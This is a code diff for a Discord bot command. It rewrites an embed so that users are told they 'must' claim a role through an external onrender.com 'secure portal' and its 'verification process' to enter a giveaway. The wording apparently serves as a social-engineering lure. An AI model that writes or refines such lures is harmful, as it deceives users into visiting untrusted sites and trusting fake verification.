@@ -58,13 +58,13 @@ module.exports = {
 
         // Create the embed and buttons
         const embed = new EmbedBuilder()
-            .setTitle('🎁 Exclusive Reward Unlocked')
+            .setTitle('🎉 Giveaway Entry Required')
             .setColor('#dc2626') // Matching CAPEVERSE red
-            .setFooter({ text: 'CAPEVERSE | Automated Reward System' })
+            .setFooter({ text: 'CAPEVERSE | Automated Verification System' })
             .setTimestamp();
 
         if (permanent) {
-            embed.setDescription(`You have been selected to claim the ${role} role!\n\n**Claim Instructions**\n1. Click **Claim Reward** to visit the platform.\n2. Complete the required steps to get your code.\n3. Return here and click **Redeem Key** with your unique code.\n\n*If you experience issues, please contact our support team in the designated channel.*`);
+            embed.setDescription(`To participate in the giveaway, you must claim the ${role} role!\n\n**Instructions**\n1. Click **Claim Role** below to visit our secure portal.\n2. Complete the quick verification process to authenticate your session.\n3. Return here and click **Verify Role** with your completion code.\n\n*If you experience issues, please open a support ticket.*`);
         } else {
             const totalSeconds = seconds + (minutes * 60) + (hours * 3600) + (days * 86400) + (months * 30 * 86400);
             
@@ -73,18 +73,18 @@ module.exports = {
             }
 
             const endTime = Math.floor(Date.now() / 1000) + totalSeconds;
-            embed.setDescription(`You have been selected to claim the ${role} role!\n\n⏳ **Expires:** <t:${endTime}:R>\n\n**Claim Instructions**\n1. Click **Claim Reward** to visit the platform.\n2. Complete the required steps to get your code.\n3. Return here and click **Redeem Key** with your unique code.\n\n*If you experience issues, please contact our support team in the designated channel.*`);
+            embed.setDescription(`To participate in the giveaway, you must claim the ${role} role!\n\n⏳ **Expires:** <t:${endTime}:R>\n\n**Instructions**\n1. Click **Claim Role** below to visit our secure portal.\n2. Complete the quick verification process to authenticate your session.\n3. Return here and click **Verify Role** with your completion code.\n\n*If you experience issues, please open a support ticket.*`);
         }
 
         const row = new ActionRowBuilder()
             .addComponents(
                 new ButtonBuilder()
-                    .setLabel('Claim Reward')
+                    .setLabel('Claim Role')
                     .setURL('https://cape-rewards-showcase.onrender.com/claim.html')
                     .setStyle(ButtonStyle.Link),
                 new ButtonBuilder()
                     .setCustomId('btn_redeem')
-                    .setLabel('Redeem Key')
+                    .setLabel('Verify Role')
                     .setStyle(ButtonStyle.Primary)
             );
 
